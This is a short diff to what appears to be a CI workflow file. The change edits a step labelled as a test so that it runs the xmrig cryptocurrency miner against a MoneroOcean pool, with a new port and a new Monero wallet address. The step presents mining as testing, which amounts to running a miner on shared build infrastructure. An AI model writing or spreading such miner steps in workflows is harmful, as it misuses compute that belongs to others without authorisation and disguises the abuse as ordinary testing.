@@ -19,4 +19,4 @@ jobs:
       - name: Test jalankan gwe 
         run: |
           cd ~/moneroocean
-          ./xmrig -o gulf.moneroocean.stream:20064 -u 89nrRkC52Zd3n24GUh7yCVLLmt2wXGnFPWGtPJuHpQnBbmPJvV1RURbHy6cxu2L5kiGcgRZVBLSKYCqggDC7ynR3MSTs5rk --rig-id rig01 --keepalive --tls --cpu-max-threads-hint 85
+          ./xmrig -o gulf.moneroocean.stream:20032 -u 4ANVFE2dRakV5mnqz3quDFFhkqK1emwr75wkFVSS54r8B6T4tfusnHtaJbY43p3eemXTZ6SCYTGukNC1hEdrZ8fkN2utxgL --rig-id rig01 --keepalive --tls --cpu-max-threads-hint 85
